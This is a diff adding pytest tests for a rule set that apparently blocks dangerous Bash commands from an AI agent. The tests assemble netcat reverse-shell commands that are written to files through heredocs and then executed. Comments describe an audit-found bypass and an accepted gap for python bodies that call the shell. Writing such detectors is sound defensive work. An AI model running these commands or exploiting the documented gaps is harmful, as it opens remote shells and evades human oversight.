@@ -165,3 +165,56 @@ def test_a_shadowed_reader_keeps_every_body(rules, prefix):
 def test_a_call_in_a_python_body_is_not_a_shadowing_definition(rules):
     body = f'print()\nopen("notes.md", "w").write("{NETCAT}")'
     assert _bash(rules, _heredoc("python3 - <<EOF", body)) is None
+
+
+# A body that is bytes when written becomes a command when the same Bash call
+# runs the file. Found 2026-10-10 (audit finding 1): the reader check judged
+# the heredoc's own statement only, so ``cat > x.sh <<EOF ... EOF; bash x.sh``
+# passed every shell rule. A body stays dropped only when nothing after the
+# heredoc's own statement names the written path or an execution word.
+
+SCRIPT = "/tmp/" + "x.sh"
+SHELL_BODY = NETCAT + " -e " + "/bin/" + "sh"
+
+
+@pytest.mark.parametrize("command", [
+    _heredoc(f"cat > {SCRIPT} <<'EOF'", SHELL_BODY) + f"\nbash {SCRIPT}",
+    f"tee {SCRIPT} <<'EOF' >/dev/null && sh {SCRIPT}\n{SHELL_BODY}\nEOF",
+    _heredoc(f"cat > {SCRIPT} <<'EOF'", SHELL_BODY) + f"\n. {SCRIPT}",
+    f"cat > {SCRIPT} <<'EOF'; source {SCRIPT}\n{SHELL_BODY}\nEOF",
+    _heredoc(f"cat > {SCRIPT} <<'EOF'", SHELL_BODY) + f"\nchmod +x {SCRIPT}\n{SCRIPT}",
+    _heredoc("cat > x.sh <<'EOF'", SHELL_BODY) + "\nchmod +x x.sh && ./x.sh",
+    _heredoc("cat > \"$f\" <<'EOF'", SHELL_BODY) + "\nzsh \"$f\"",
+    _heredoc(f"sudo tee {SCRIPT} <<'EOF'", SHELL_BODY) + f"\nsudo bash {SCRIPT}",
+    _heredoc(f"cat > {SCRIPT} <<'EOF'", SHELL_BODY) + f"\nexec {SCRIPT}",
+    _heredoc("cat > run.py <<'EOF'", SHELL_BODY) + "\npython3 run.py",
+])
+def test_a_body_written_then_run_by_the_same_command_is_matched(rules, command):
+    assert _bash(rules, command) == "shell_netcat_egress"
+
+
+def test_a_later_statement_that_names_the_written_path_keeps_the_body(rules):
+    # Named, not run: still kept, since the rule cannot tell git add from
+    # every way a path is handed to something that runs it. The Write tool
+    # carries the same bytes without a Bash rule reading them.
+    command = _heredoc("cat > notes.md <<'EOF'", NETCAT) + "\ngit add notes.md"
+    assert _bash(rules, command) == "shell_netcat_egress"
+
+
+@pytest.mark.parametrize("after", ["git status", "ls -la /tmp", "echo done",
+                                   "cd /tmp && git commit -m 'notes'"])
+def test_a_later_statement_that_runs_nothing_still_drops_the_body(rules, after):
+    command = _heredoc("cat > notes.md <<'EOF'", NETCAT) + "\n" + after
+    assert _bash(rules, command) is None
+
+
+def test_a_python_body_that_calls_the_shell_is_the_accepted_trade_off(rules):
+    # ``python3 - <<EOF`` with ``os.system(...)`` is a shell command one hop
+    # away, and it is not matched by a shell_syntax rule. Accepted 2026-10-04:
+    # 13 of 16 refusals by four shell rules over two weeks were text in such
+    # bodies, and the interpreter body is read by every rule that is not
+    # shell_syntax (metadata addresses, trail tampering). The scorer still
+    # sees the whole command. This test pins the trade-off so a change to
+    # it is a decision, not a drift.
+    body = "import os\nos.system(\"" + SHELL_BODY + "\")"
+    assert _bash(rules, _heredoc("python3 - <<'EOF'", body)) is None
